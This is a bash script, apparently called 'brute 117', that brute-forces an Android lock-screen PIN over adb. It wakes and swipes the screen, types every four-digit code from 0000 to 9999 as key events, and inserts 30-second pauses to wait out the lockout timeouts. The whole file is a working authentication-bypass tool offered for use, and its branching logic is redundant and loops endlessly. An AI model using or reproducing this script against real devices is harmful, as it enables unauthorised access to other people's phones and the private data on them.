#!/bin/bash

screen="$(adb shell dumpsys activity|grep -i mCurrentFocus|awk 'NR==1{print $3}'|cut -d'}' -f1)"
case $screen in
    "mScreenState=OFF") echo -e "Preparing to attack."; 
        echo -e "All Has Been Set" ;;
    "mScreenState=ON_UNLOCKED") adb shell input keyevent 26
esac
echo -e "(((_.-=-._.-=-._)))"
echo -e " ))~~~~~~~~~~~~~(( "
echo -e "(( > brute 117 < ))"
echo -e " )).............(( "
echo -e "(((<-._.-'<-._.-)))"
adb shell input keyevent 3
adb shell input keyevent 82
adb shell input swipe 407 1211 378 85
while true
do
    for i in {0000..9999}; do
        echo $((10#$i))
        if [[ $i != 1036 ]]; then
            if [[ $((10#$i)) == 5 ]]; then
                echo -e "(( >  timeout  < ))"
                echo -e "(((<-._.-'<-._.-)))"
                sleep 30
                echo -e "(( >    \e[1m$i\e[0m   < ))"
                echo -e " ))~~~~~~~~~~~~~(( "
                for (( j=0; j<${#i}; j++ )); do
                    adb shell input keyevent $((`echo ${i:$j:1}`+7))
                done
                adb shell input keyevent 66
            elif [[ $((10#$i)) == 11 ]]; then
                echo -e "(( >  timeout  < ))"
                echo -e "(((<-._.-'<-._.-)))"
                sleep 30
                echo -e "(( >    \e[1m$i\e[0m   < ))"
                echo -e " ))~~~~~~~~~~~~~(( "
                for (( j=0; j<${#i}; j++ )); do
                    adb shell input keyevent $((`echo ${i:$j:1}`+7))
                done
                adb shell input keyevent 66
            elif ( [[ $((10#$i)) != 5 ]] || [[ $((10#$i)) != 11 ]] ) && ( [[ $((10#$i)) -lt 11 ]] || [[ $((10#$i)) -eq 11 ]] ); then
                echo -e "(( >    \e[1m$i\e[0m   < ))"
                echo -e " ))~~~~~~~~~~~~~(( "
                for (( j=0; j<${#i}; j++ )); do
                    adb shell input keyevent $((`echo ${i:$j:1}`+7))
                done
                adb shell input keyevent 66
            elif ( [[ $((10#$i)) != 5 ]] || [[ $((10#$i)) != 11 ]] ) && [[ $((10#$i)) -gt 11 ]]; then
                echo -e "(( >  timeout  < ))"
                echo -e "(((<-._.-'<-._.-)))"
                sleep 30
                echo -e "(( >    \e[1m$i\e[0m   < ))"
                echo -e " ))~~~~~~~~~~~~~(( "
                for (( j=0; j<${#i}; j++ )); do
                    adb shell input keyevent $((`echo ${i:$j:1}`+7))
                done
                adb shell input keyevent 66
            fi
            # echo -e "(( >    \e[1m$i\e[0m   < ))"
            # echo -e " ))~~~~~~~~~~~~~(( "
            # for (( j=0; j<${#i}; j++ )); do
            #     adb shell input keyevent $((`echo ${i:$j:1}`+7))
            # done
            # adb shell input keyevent 66
            # if ! (( `expr $i + 1` % 5 )); then
            #     echo -e "(( >  timeout  < ))"
            #     echo -e "(((<-._.-'<-._.-)))"
            #     sleep 35
            # fi
        fi
    done
done